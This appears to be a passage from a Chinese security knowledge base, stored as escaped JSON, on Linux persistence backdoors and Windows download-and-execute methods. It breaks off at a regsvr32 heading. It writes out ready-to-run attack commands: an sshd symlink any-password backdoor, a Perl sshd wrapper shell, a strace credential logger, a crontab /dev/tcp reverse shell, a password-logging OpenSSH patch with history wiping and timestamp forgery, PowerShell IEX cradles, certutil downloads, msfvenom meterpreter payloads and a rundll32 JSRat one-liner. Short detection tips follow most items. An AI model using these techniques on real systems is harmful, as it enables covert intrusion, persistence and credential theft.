\u5728\u5ba2\u6237\u7aef\u4e0a\u751f\u6210\u4e00\u5bf9\u516c\u79c1\u94a5\uff0c\u7136\u540e\u628a\u516c\u94a5\u653e\u5230\u670d\u52a1\u5668\u4e0a\uff08~/.ssh/authorized_keys\uff09\uff0c\u4fdd\u7559\u79c1\u94a5\u3002\u5f53ssh\u767b\u5f55\u65f6\uff0cssh\u7a0b\u5e8f\u4f1a\u53d1\u9001\u79c1\u94a5\u53bb\u548c\u670d\u52a1\u5668\u4e0a\u7684\u516c\u94a5\u505a\u5339\u914d\u3002\u5982\u679c\u5339\u914d\u6210\u529f\u5c31\u53ef\u4ee5\u767b\u5f55\u4e86\u3002 \u5ba2\u6237\u7aef\uff1a ssh-keygen -t rsa \u8fc7\u7a0b\u4e2d\u6309\u4e09\u6b21\u56de\u8f66\uff0c\u6267\u884c\u7ed3\u675f\u5982\u4e0b\u56fe: \u8fdb\u5165/root/.ssh/\u6587\u4ef6\u5939\uff0c\u67e5\u770b\u6587\u4ef6\u5939\u7684\u5185\u5bb9\uff0c\u5982\u4e0b\u6240\u793a\uff1a \u5176\u4e2d id_rsa \u4e3a\u79c1\u94a5\uff0c id_rsa.pub \u4e3a\u516c\u94a5\uff0c\u63a5\u4e0b\u6765\u6253\u5f00 id_rsa.pub \uff0c\u5c06\u5185\u5bb9\u590d\u5236\u5230\u670d\u52a1\u5668\u3002\u5c06 id_rsa.pub \u7684\u5185\u5bb9\u8ffd\u52a0\u5230 /root/.ssh/authorized_keys \u5185\uff0c\u914d\u7f6e\u5b8c\u6210\u3002 \u6392\u67e5\u6280\u5de7\uff1a\u67e5\u770b /root/.ssh/authorized_keys \u662f\u5426\u88ab\u4fee\u6539\u3002 4\u3001\u8f6f\u8fde\u63a5 \u5728sshd\u670d\u52a1\u914d\u7f6e\u8fd0\u884cPAM\u8ba4\u8bc1\u7684\u524d\u63d0\u4e0b\uff0cPAM\u914d\u7f6e\u6587\u4ef6\u4e2d\u63a7\u5236\u6807\u5fd7\u4e3asufficient\u65f6\u53ea\u8981pam_rootok\u6a21\u5757\u68c0\u6d4buid\u4e3a0\u5373root\u6743\u9650\u5373\u53ef\u6210\u529f\u8ba4\u8bc1\u767b\u9646\u3002\u901a\u8fc7\u8f6f\u8fde\u63a5\u7684\u65b9\u5f0f\uff0c\u5b9e\u8d28\u4e0aPAM\u8ba4\u8bc1\u662f\u901a\u8fc7\u8f6f\u8fde\u63a5\u7684\u6587\u4ef6\u540d /tmp/su \u5728 /etc/pam.d/ \u76ee\u5f55\u4e0b\u5bfb\u627e\u5bf9\u5e94\u7684PAM\u914d\u7f6e\u6587\u4ef6(\u5982: /etc/pam.d/su)\uff0c\u4efb\u610f\u5bc6\u7801\u767b\u9646\u7684\u6838\u5fc3\u662f auth sufficient pam_rootok.so \uff0c\u6240\u4ee5\u53ea\u8981PAM\u914d\u7f6e\u6587\u4ef6\u4e2d\u5305\u542b\u6b64\u914d\u7f6e\u5373\u53efSSH\u4efb\u610f\u5bc6\u7801\u767b\u9646\uff0c\u9664\u4e86su\u4e2d\u4e4b\u5916\u8fd8\u6709chsh\u3001chfn\u540c\u6837\u53ef\u4ee5\u3002 \u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u53e5\u8bdd\u540e\u95e8\uff1a ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888 \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u4efb\u4f55\u4e00\u53f0\u673a\u5668 ssh root@IP -p 8888 \uff0c\u8f93\u5165\u4efb\u610f\u5bc6\u7801\uff0c\u6210\u529f\u767b\u5f55\u3002 \u6392\u67e5\u6280\u5de7\uff1a\u8fdb\u7a0b\u3001\u7aef\u53e3\u90fd\u53ef\u4ee5\u53d1\u73b0\u5f02\u5e38\uff0c kill -s 9 PID \u7ed3\u675f\u8fdb\u7a0b\u5373\u53ef\u6e05\u9664\u540e\u95e8\u3002 5\u3001SSH wrapper \u9996\u5148\u542f\u52a8\u7684\u662f/usr/sbin/sshd,\u811a\u672c\u6267\u884c\u5230getpeername\u8fd9\u91cc\u7684\u65f6\u5019\uff0c\u6b63\u5219\u5339\u914d\u4f1a\u5931\u8d25\uff0c\u4e8e\u662f\u6267\u884c\u4e0b\u4e00\u53e5\uff0c\u542f\u52a8/usr/bin/sshd\uff0c\u8fd9\u662f\u539f\u59cbsshd\u3002\u539f\u59cb\u7684sshd\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u4e86tcp\u8fde\u63a5\u540e\uff0c\u4f1afork\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u5904\u7406\u5177\u4f53\u5de5\u4f5c\u3002\u8fd9\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u6ca1\u6709\u4ec0\u4e48\u68c0\u9a8c\uff0c\u800c\u662f\u76f4\u63a5\u6267\u884c\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4f4d\u7f6e\u7684/usr/sbin/sshd\uff0c\u8fd9\u6837\u5b50\u63a7\u5236\u6743\u53c8\u56de\u5230\u811a\u672c\u4e86\u3002\u6b64\u65f6\u5b50\u8fdb\u7a0b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5df2\u88ab\u91cd\u5b9a\u5411\u5230\u5957\u63a5\u5b57\uff0cgetpeername\u80fd\u771f\u7684\u83b7\u53d6\u5230\u5ba2\u6237\u7aef\u7684TCP\u6e90\u7aef\u53e3\uff0c\u5982\u679c\u662f19526\u5c31\u6267\u884csh\u7ed9\u4e2ashell \u7b80\u5355\u70b9\u5c31\u662f\u4ecesshd fork\u51fa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u8f93\u5165\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u5957\u63a5\u5b57\uff0c\u5e76\u5bf9\u8fde\u8fc7\u6765\u7684\u5ba2\u6237\u7aef\u7aef\u53e3\u8fdb\u884c\u4e86\u5224\u65ad\u3002 \u670d\u52a1\u7aef\uff1a cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd /etc/init.d/sshd restart \u5ba2\u6237\u7aef\uff1a socat STDIO TCP4:target_ip:22,sourceport=13377 #\u5982\u679c\u4f60\u60f3\u4fee\u6539\u6e90\u7aef\u53e3\uff0c\u53ef\u4ee5\u7528python\u7684struct\u6807\u51c6\u5e93\u5b9e\u73b0\u3002\u5176\u4e2dx00x00LF\u662f19526\u7684\u5927\u7aef\u5f62\u5f0f\uff0c\u4fbf\u4e8e\u4f20\u8f93\u548c\u5904\u7406\u3002 >>> import struct >>> buffer = struct.pack('>I6',19526) >>> print repr(buffer) '\\x00\\x00LF' >>> buffer = struct.pack('>I6',13377) >>> print buffer 4A \u6392\u67e5\u6280\u5de7\uff1a # ls -al /usr/sbin/sshd # cat /usr/sbin/sshd \u53ef\u901a\u8fc7\u91cd\u88c5ssh\u670d\u52a1\u6062\u590d\u3002 6\u3001strace\u540e\u95e8 \u901a\u8fc7\u547d\u4ee4\u66ff\u6362\u52a8\u6001\u8ddf\u8e2a\u7cfb\u7edf\u8c03\u7528\u548c\u6570\u636e\uff0c\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u7528\u6237ssh\u3001su\u3001sudo\u7684\u64cd\u4f5c\u3002 #vim /etc/bashrc alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh' # source /root/.bashrc \u6392\u67e5\u6280\u5de7\uff1a\u4f7f\u7528 alias \u5373\u53ef\u53d1\u73b0\u5f02\u5e38\u3002 7\u3001crontab\u53cd\u5f39shell crontab\u547d\u4ee4\u7528\u4e8e\u8bbe\u7f6e\u5468\u671f\u6027\u88ab\u6267\u884c\u7684\u6307\u4ee4\u3002\u65b0\u5efashell\u811a\u672c\uff0c\u5229\u7528\u811a\u672c\u8fdb\u884c\u53cd\u5f39\u3002 a\u3001\u521b\u5efashell\u811a\u672c\uff0c\u4f8b\u5982\u5728/etc/evil.sh #!/bin/bash bash -i >& /dev/tcp/192.168.28.131/12345 0>&1 chmod +sx /etc/evil.sh b\u3001crontab -e \u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1 #\u6bcf\u4e00\u5206\u949f\u6267\u884c\u4e00\u6b21 */1 * * * * root /etc/evil.sh \u91cd\u542fcrond\u670d\u52a1\uff0c service crond restart \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u7528nc\u63a5\u6536shell\u3002 \u6392\u67e5\u6280\u5de7\uff1a # \u67e5\u770b\u53ef\u7591\u7684\u5b9a\u65f6\u4efb\u52a1\u5217\u8868 crontab -e 8\u3001openssh\u540e\u95e8 \u5229\u7528openssh\u540e\u95e8\uff0c\u8bbe\u7f6eSSH\u540e\u95e8\u5bc6\u7801\u53caroot\u5bc6\u7801\u8bb0\u5f55\u4f4d\u7f6e\uff0c\u9690\u853d\u6027\u8f83\u5f3a\uff0c\u4e0d\u6613\u88ab\u53d1\u73b0\u3002 a\u3001\u5907\u4efdSSH\u914d\u7f6e\u6587\u4ef6 mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old b\u3001\u89e3\u538b\u5e76\u5b89\u88c5\u8865\u4e01 tar zxf openssh-5.9p1.tar.gz tar zxf openssh-5.9p1.tar.gz cp openssh-5.9p1.patch/sshbd5.9p1.diff /openssh-5.9p1 cd openssh-5.9p1 patch < sshbd5.9p1.diff c\u3001\u8bb0\u5f55\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u6587\u4ef6\u4f4d\u7f6e\u53ca\u5176\u5bc6\u7801 vi includes.h #define ILOG \"/tmp/1.txt\" //\u8bb0\u5f55\u767b\u5f55\u672c\u673a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 #define OLOG \"/tmp/2.txt\" //\u8bb0\u5f55\u672c\u673a\u767b\u5f55\u8fdc\u7a0b\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 #define SECRETPW \"123456789\" //\u540e\u95e8\u7684\u5bc6\u7801 d\u3001\u4fee\u6539\u7248\u672c\u4fe1\u606f vi version.h #define SSH_VERSION \"\u586b\u5165\u4e4b\u524d\u8bb0\u4e0b\u6765\u7684\u7248\u672c\u53f7,\u4f2a\u88c5\u539f\u7248\u672c\" #define SSH_PORTABLE \"\u5c0f\u7248\u672c\u53f7\" e\u3001\u5b89\u88c5\u5e76\u7f16\u8bd1 ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 make clean make && make install service sshd restart f\u3001\u5bf9\u6bd4\u539f\u6765\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4f7f\u914d\u7f6e\u6587\u4ef6\u4e00\u81f4\uff0c\u7136\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f\u3002 touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config g\u3001\u6e05\u9664\u64cd\u4f5c\u8bb0\u5f55 export HISTFILE=/dev/null export HISTSIZE=0 echo >/root/.bash_history //\u6e05\u7a7a\u64cd\u4f5c\u65e5\u5fd7 \u6392\u67e5\u6280\u5de7\uff1a\u5229\u7528strace\u627e\u51fassh\u540e\u95e8. # 1\u3001\u83b7\u53d6\u53ef\u7591\u8fdb\u7a0bPI ps aux | grep sshd # 2\u3001\u8ddf\u8e2asshd PID strace -o aa -ff -p PID # 3\u3001\u67e5\u770b\u8bb0\u5f55\u5bc6\u7801\u6253\u5f00\u6587\u4ef6 grep open sshd* | grep -v -e No -e null -e denied| grep WR 9\u3001PAM\u540e\u95e8 PAM \uff08Pluggable Authentication Modules \uff09\u662f\u7531Sun\u63d0\u51fa\u7684\u4e00\u79cd\u8ba4\u8bc1\u673a\u5236\u3002\u5b83\u901a\u8fc7\u63d0\u4f9b\u4e00\u4e9b\u52a8\u6001\u94fe\u63a5\u5e93\u548c\u4e00\u5957\u7edf\u4e00\u7684API\uff0c\u5c06\u7cfb\u7edf\u63d0\u4f9b\u7684\u670d\u52a1\u548c\u8be5\u670d\u52a1\u7684\u8ba4\u8bc1\u65b9\u5f0f\u5206\u5f00\uff0c\u4f7f\u5f97\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u7075\u6d3b\u5730\u6839\u636e\u9700\u8981\u7ed9\u4e0d\u540c\u7684\u670d\u52a1\u914d\u7f6e\u4e0d\u540c\u7684\u8ba4\u8bc1\u65b9\u5f0f\u800c\u65e0\u9700\u66f4\u6539\u670d\u52a1\u7a0b\u5e8f\uff0c\u540c\u65f6\u4e5f\u4fbf\u4e8e\u5411\u7cfb\u7edf\u4e2d\u6dfb\u52a0\u65b0\u7684\u8ba4\u8bc1\u624b\u6bb5\u3002PAM\u6700\u521d\u662f\u96c6\u6210\u5728Solaris\u4e2d\uff0c\u76ee\u524d\u5df2\u79fb\u690d\u5230\u5176\u5b83\u7cfb\u7edf\u4e2d\uff0c\u5982Linux\u3001SunOS\u3001HP-UX 9.0\u7b49\u3002 \u5229\u7528\u65b9\u6cd5: 1\u3001\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u6240\u4f7f\u7528\u7684PAM\u7248\u672c\uff0c\u4e0b\u8f7d\u5bf9\u5e94\u7248\u672c\u7684pam\u7248\u672c 2\u3001\u89e3\u538b\u7f29\uff0c\u4fee\u6539pam_unix_auth.c\u6587\u4ef6\uff0c\u6dfb\u52a0\u4e07\u80fd\u5bc6\u7801 3\u3001\u7f16\u8bd1\u5b89\u88c5PAM 4\u3001\u7f16\u8bd1\u5b8c\u540e\u7684\u6587\u4ef6\u5728\uff1amodules/pam_unix/.libs/pam_unix.so\uff0c\u590d\u5236\u5230/lib64/security\u4e2d\u8fdb\u884c\u66ff\u6362\uff0c\u5373\u53ef\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\u767b\u9646\uff0c\u5e76\u5c06\u7528\u6237\u540d\u5bc6\u7801\u8bb0\u5f55\u5230\u6587\u4ef6\u4e2d\u3002 \u6392\u67e5\u6280\u5de7\uff1a # 1\u3001\u901a\u8fc7Strace\u8ddf\u8e2assh ps axu | grep sshd strace -o aa -ff -p PID grep open aa* | grep -v -e No -e null -e denied| grep WR # 2\u3001\u68c0\u67e5pam_unix.so\u7684\u4fee\u6539\u65f6\u95f4 stat /lib/security/pam_unix.so #32\u4f4d stat /lib64/security/pam_unix.so #64\u4f4d 10\u3001rookit\u540e\u95e8 Mafix\u662f\u4e00\u6b3e\u5e38\u7528\u7684\u8f7b\u91cf\u5e94\u7528\u7ea7\u522bRootkits\uff0c\u662f\u901a\u8fc7\u4f2a\u9020ssh\u534f\u8bae\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u767b\u9646\u7684\u7279\u70b9\u662f\u914d\u7f6e\u7b80\u5355\u5e76\u53ef\u4ee5\u81ea\u5b9a\u4e49\u9a8c\u8bc1\u5bc6\u7801\u548c\u7aef\u53e3\u53f7\u3002 \u5229\u7528\u65b9\u6cd5\uff1a\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u4f7f\u7528ssh \u7528\u6237@IP -P \u914d\u7f6e\u7684\u7aef\u53e3\uff0c\u5373\u53ef\u8fdc\u7a0b\u767b\u5f55\u3002 \u8fde\u63a5\u540e\u7684\u622a\u56fe\uff1a \u6392\u67e5\u6280\u5de7\uff1a\u67e5\u770b\u7aef\u53e3\u662f\u5426\u5f02\u5e38\uff0cRPM check\u67e5\u770b\u547d\u4ee4\u662f\u5426\u88ab\u66ff\u6362\u3002 \u53c2\u8003\u94fe\u63a5\uff1a LINUX\u7684\u4e24\u79cd\u540e\u95e8\u603b\u7ed3(suid shell\u4e0einetd) https://www.cnblogs.com/milantgh/p/3601812.html linux\u540e\u95e8\u603b\u7ed3 https://www.cnblogs.com/zaqzzz/p/12099463.html https://www.secpulse.com/archives/100484.html linux\u5404\u79cd\u4e00\u53e5\u8bdd\u53cd\u5f39shell\u603b\u7ed3 https://yq.aliyun.com/articles/519250?type=2 Linux OpenSSH\u540e\u95e8\u7684\u6dfb\u52a0\u4e0e\u9632\u8303 https://yq.aliyun.com/articles/69350 Linux\u540e\u95e8\u6574\u7406\u5408\u96c6 https://www.cnblogs.com/maplered/p/9224617.html https://www.cnblogs.com/zlgxzswjy/p/6209571.html linux \u540e\u95e8 https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/","title":"\u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#5windows","text":"\u5f53\u6211\u4eec\u901a\u8fc7Web\u6e17\u900f\u83b7\u53d6\u4e86\u4e00\u4e2aShell\uff0c\u800c\u4e14\u76ee\u6807\u4e3b\u673a\u662fWindows\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u53bb\u4e0b\u8f7d\u540e\u95e8\u6587\u4ef6\u5230\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\u5462\uff1f \u4e00\u822c\u6765\u8bf4\uff0c\u5b9e\u73b0Windows\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u65b9\u5f0f\u4e0d\u5916\u4e4e\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\u3002\u7b2c\u4e00\u79cd\uff0c\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u5230\u672c\u5730\uff0c\u7136\u540e\u518d\u6267\u884c\uff1b \u7b2c\u4e8c\u79cd\uff0c\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\uff0c\u6267\u884c\u8fc7\u7a0b\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u843d\u5730\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5df2\u7136\u6210\u4e3a\u540e\u95e8\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u9996\u8981\u65b9\u5f0f** \u3002**\u53e6\u5916\u5462\uff0c\u53ea\u8981\u4f60\u6240\u5728\u670d\u52a1\u5668\u7684\u73af\u5883\u652f\u6301\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4efb\u4f55\u4e00\u95e8\u8bed\u8a00\u6765\u5b9e\u73b0\u5b83\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6682\u4e0d\u5728\u672c\u6587\u7684\u8ba8\u8bba\u8303\u56f4\u4e4b\u5185\u3002 \u5728\u8fd9\u91cc\uff0c****\u672c\u6587\u6536\u96c6\u4e8615\u79cd\u5e38\u89c1\u7684\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u5e76\u7ed3\u5408\u5177\u4f53\u6848\u4f8b \uff0c\u8ba9\u6211\u4eec\u4e00\u8d77\u6765\u770b\u770b\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u5427\u3002 PowerShell Bitsadmin certutil wget ipc$\u6587\u4ef6\u5171\u4eab FTP TFTP WinScp msiexec IEExec mshta rundll32 regsvr32 MSXSL.EXE pubprn.vbs 1\u3001PowerShell PowerShell\u662f\u4e00\u79cd\u547d\u4ee4\u884c\u5916\u58f3\u7a0b\u5e8f\u548c\u811a\u672c\u73af\u5883\uff0c\u4f7f\u547d\u4ee4\u884c\u7528\u6237\u548c\u811a\u672c\u7f16\u5199\u8005\u53ef\u4ee5\u5229\u7528\u3002 \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u4fdd\u5b58\u5728\u672c\u5730\uff1a powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe') \u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff1a powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))\" 2\u3001Bitsadmin bitsadmin\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u7528\u4e8e\u521b\u5efa\u4e0b\u8f7d\u6216\u4e0a\u4f20\u5de5\u4f5c\u548c\u76d1\u6d4b\u5176\u8fdb\u5c55\u60c5\u51b5\u3002 bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\\test\\1.txt \u8f93\u5165\u4ee5\u4e0a\u547d\u4ee4\uff0c\u6210\u529f\u4e0b\u8f7d\u6587\u4ef6\u3002 3\u3001certutil \u7528\u4e8e\u5907\u4efd\u8bc1\u4e66\u670d\u52a1\uff0c\u652f\u6301xp-win10\u90fd\u652f\u6301\u3002\u7531\u4e8ecertutil\u4e0b\u8f7d\u6587\u4ef6\u90fd\u4f1a\u7559\u4e0b\u7f13\u5b58\uff0c\u6240\u4ee5\u4e00\u822c\u90fd\u5efa\u8bae\u4e0b\u8f7d\u5b8c\u6587\u4ef6\u540e\u5bf9\u7f13\u5b58\u8fdb\u884c\u5220\u9664\u3002 \u6ce8\uff1a\u7f13\u5b58\u76ee\u5f55\u4e3a\uff1a\"%USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\" #\u4e0b\u8f7d\u6587\u4ef6 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php #\u5220\u9664\u7f13\u5b58 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete 4\u3001wget Windows\u73af\u5883\u4e0b\uff0c\u53ef\u4e0a\u4f20\u514d\u5b89\u88c5\u7684\u53ef\u6267\u884c\u7a0b\u5e8fwget.exe\u5230\u76ee\u6807\u673a\u5668\uff0c\u4f7f\u7528wget\u4e0b\u8f7d\u6587\u4ef6\u3002 wget.exe\u4e0b\u8f7d\uff1a https://eternallybored.org/misc/wget/ wget -O \"evil.txt\" http://192.168.28.128/imag/evil.txt 5\u3001ipc$\u6587\u4ef6\u5171\u4eab IPC$(Internet Process Connection)\u662f\u5171\u4eab\"\u547d\u540d\u7ba1\u9053\"\u7684\u8d44\u6e90\uff0c\u5b83\u662f\u4e3a\u4e86\u8ba9\u8fdb\u7a0b\u95f4\u901a\u4fe1\u800c\u5f00\u653e\u7684\u547d\u540d\u7ba1\u9053\uff0c\u901a\u8fc7\u63d0\u4f9b\u53ef\u4fe1\u4efb\u7684\u7528\u6237\u540d\u548c\u53e3\u4ee4\uff0c\u8fde\u63a5\u53cc\u65b9\u53ef\u4ee5\u5efa\u7acb\u5b89\u5168\u7684\u901a\u9053\u5e76\u4ee5\u6b64\u901a\u9053\u8fdb\u884c\u52a0\u5bc6\u6570\u636e\u7684\u4ea4\u6362\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8bbf\u95ee\u3002 #\u5efa\u7acb\u8fdc\u7a0bIPC\u8fde\u63a5 net use \\\\192.168.28.128\\ipc$ /user:administrator \"abc123!\" #\u590d\u5236\u8fdc\u7a0b\u6587\u4ef6\u5230\u672c\u5730\u4e3b\u673a copy \\\\192.168.28.128\\c$\\2.txt D:\\test 6\u3001FTP \u4e00\u822c\u60c5\u51b5\u4e0b\u653b\u51fb\u8005\u4f7f\u7528FTP\u4e0a\u4f20\u6587\u4ef6\u9700\u8981\u5f88\u591a\u4ea4\u4e92\u7684\u6b65\u9aa4\uff0c\u4e0b\u9762\u8fd9\u4e2a bash\u811a\u672c\uff0c\u8003\u8651\u5230\u4e86\u4ea4\u4e92\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5e76\u4e0d\u4f1a\u4ea7\u751f\u4ea4\u4e92\u52a8\u4f5c\u3002 ftp 127.0.0.1 username password get file exit 7\u3001TFTP \u7528\u6765\u4e0b\u8f7d\u8fdc\u7a0b\u6587\u4ef6\u7684\u6700\u7b80\u5355\u7684\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u57fa\u4e8eUDP\u534f\u8bae\u800c\u5b9e\u73b0 tftp32\u670d\u52a1\u7aef\u4e0b\u8f7d\u5730\u5740\uff1a http://tftpd32.jounin.net/tftpd32_download.html tftp -i \u4f60\u7684IP get \u8981\u4e0b\u8f7d\u6587\u4ef6 \u5b58\u653e\u4f4d\u7f6e 8\u3001WinScp WinSCP\u662f\u4e00\u4e2aWindows\u73af\u5883\u4e0b\u4f7f\u7528SSH\u7684\u5f00\u6e90\u56fe\u5f62\u5316SFTP\u5ba2\u6237\u7aef\u3002 #\u4e0a\u4f20 winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"put D:\\1.txt /tmp/\" \"exit\" /log=log_file.txt #\u4e0b\u8f7d winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"get /tmp D:\\test\\app\\\" \"exit\" /log=log_file.tx \u4f7f\u7528winscp.exe \u4f5c\u4e3a\u547d\u4ee4\u884c\u53c2\u6570\u6267\u884c\u8fdc\u7a0b\u4e0a\u4f20/\u4e0b\u8f7d\u64cd\u4f5c\u3002 9\u3001msiexec msiexec \u652f\u6301\u8fdc\u7a0b\u4e0b\u8f7d\u529f\u80fd\uff0c\u5c06msi\u6587\u4ef6\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u8fdc\u7a0b\u6267\u884c\uff1a #\u751f\u6210msi\u5305 msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi #\u8fdc\u7a0b\u6267\u884c msiexec /q /i http://192.168.28.128/evil.msi \u6210\u529f\u6dfb\u52a0\u4e86\u4e00\u4e2atest\u7528\u6237\uff1a 10\u3001IEExec IEexec.exe\u5e94\u7528\u7a0b\u5e8f\u662f.NET Framework\u9644\u5e26\u7a0b\u5e8f\uff0c\u5b58\u5728\u4e8e\u591a\u4e2a\u7cfb\u7edf\u767d\u540d\u5355\u5185\u3002 \u751f\u6210Payload\uff1a msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe \u4f7f\u7528\u7ba1\u7406\u5458\u8eab\u4efd\u6253\u5f00cmd\uff0c\u5206\u522b\u8fd0\u884c\u4e0b\u9762\u4e24\u6761\u547d\u4ee4\u3002 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>caspol.exe -s off C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe 11\u3001mshta mshta\u7528\u4e8e\u6267\u884c.hta\u6587\u4ef6\uff0c\u800chta\u662fHTML Applocation \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662fHTML\u5e94\u7528\u7a0b\u5e8f\u3002\u800chta\u4e2d\u4e5f\u652f\u6301VBS\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528hta\u6765\u4e0b\u8f7d\u6587\u4ef6\u3002 mshta http://192.168.28.128/run.hta run.hta\u5185\u5bb9\u5982\u4e0b\uff1a <HTML> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"> <HEAD> <script language=\"VBScript\"> Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(\"Wscript.Shell\") objShell.Run \"cmd.exe /c net user test password /add\" // \u8fd9\u91cc\u586b\u5199\u547d\u4ee4 self.close </script> <body> demo </body> </HEAD> </HTML> 12\u3001rundll32 \u5176\u5b9e\u8fd8\u662f\u4f9d\u8d56\u4e8eWScript.shell\u8fd9\u4e2a\u7ec4\u4ef6\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528JSRat\u6765\u505a\u6f14\u793a\uff0cJSRat\u662f\u4e00\u4e2a\u547d\u4ee4\u548c\u63a7\u5236\u6846\u67b6\uff0c\u4ec5\u4e3arundll32.exe\u548cregsvr32.exe\u751f\u6210\u6076\u610f\u7a0b\u5e8f\u3002 \u9879\u76ee\u5730\u5740\uff1a https://github.com/Hood3dRob1n/JSRat-Py.git \u6b65\u9aa4\u4e00\uff1a\u5f00\u59cb\u8fd0\u884cJSRat\uff0c\u76d1\u542c\u672c\u57308888\u7aef\u53e3\u3002 \u6b65\u9aa4\u4e8c\uff1a\u901a\u8fc7url\u8bbf\u95ee\uff0c\u53ef\u4ee5\u67e5\u770b\u6076\u610f\u4ee3\u7801\u3002 \u590d\u5236\u4ee3\u7801\u5982\u4e0b\uff1a rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.28.131:8888/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);} \u6b65\u9aa4\u4e09\uff1a\u5728\u53d7\u5bb3\u8005PC\u8fd0\u884c\u8be5\u4ee3\u7801\uff0c\u5c06\u6210\u529f\u8fd4\u56de\u4e00\u4e2a\u4f1a\u8bdd\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 13\u3001regsvr32 